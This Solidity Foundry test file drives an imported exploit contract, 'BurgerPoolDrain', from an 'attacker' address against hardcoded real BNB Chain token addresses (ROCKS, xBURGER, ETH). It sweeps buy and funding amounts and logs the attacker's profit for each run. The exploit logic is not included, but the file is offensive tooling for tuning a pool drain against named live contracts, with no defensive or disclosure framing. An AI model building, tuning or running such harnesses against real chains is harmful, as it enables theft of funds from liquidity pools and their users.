// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerPoolDrain.sol";

contract BurgerPoolTest3 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant ROCKS = 0xA01000C52b234a92563BA61e5649b7C76E1ba0f3;
    address constant xBURGER = 0xe6DF05CE8C8301223373CF5B969AFCb1498c5528;
    address constant ETH_TOKEN = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8;

    function _testPool(
        address token, uint256 buyWbnb, uint256 seedWbnb, uint256 pairPct, uint256 fundBnb
    ) internal returns (int256) {
        address att = makeAddr("attacker");
        vm.deal(att, fundBnb);
        vm.startPrank(att);

        uint256 bef = att.balance;
        BurgerPoolDrain e = new BurgerPoolDrain();

        try e.attack{value: fundBnb - 1 ether}(token, buyWbnb, seedWbnb, pairPct) {
            vm.stopPrank();
            return int256(att.balance) - int256(bef);
        } catch {
            vm.stopPrank();
            return type(int256).min;
        }
    }

    // ROCKS: try higher buy amounts
    function test_rocks_1000() public {
        int256 d = _testPool(ROCKS, 1000 ether, 0, 50, 1500 ether);
        emit log_named_int("ROCKS 1000", d);
    }

    function test_rocks_1200() public {
        int256 d = _testPool(ROCKS, 1200 ether, 0, 50, 1800 ether);
        emit log_named_int("ROCKS 1200", d);
    }

    function test_rocks_1500() public {
        int256 d = _testPool(ROCKS, 1500 ether, 0, 50, 2000 ether);
        emit log_named_int("ROCKS 1500", d);
    }

    // xBURGER: try higher buy amounts
    function test_xburger_400() public {
        int256 d = _testPool(xBURGER, 400 ether, 0, 50, 600 ether);
        emit log_named_int("xBURGER 400", d);
    }

    function test_xburger_500() public {
        int256 d = _testPool(xBURGER, 500 ether, 0, 50, 700 ether);
        emit log_named_int("xBURGER 500", d);
    }

    // ETH: try higher
    function test_eth_100() public {
        int256 d = _testPool(ETH_TOKEN, 100 ether, 0, 50, 200 ether);
        emit log_named_int("ETH 100", d);
    }

    function test_eth_120() public {
        int256 d = _testPool(ETH_TOKEN, 120 ether, 0, 50, 200 ether);
        emit log_named_int("ETH 120", d);
    }
}
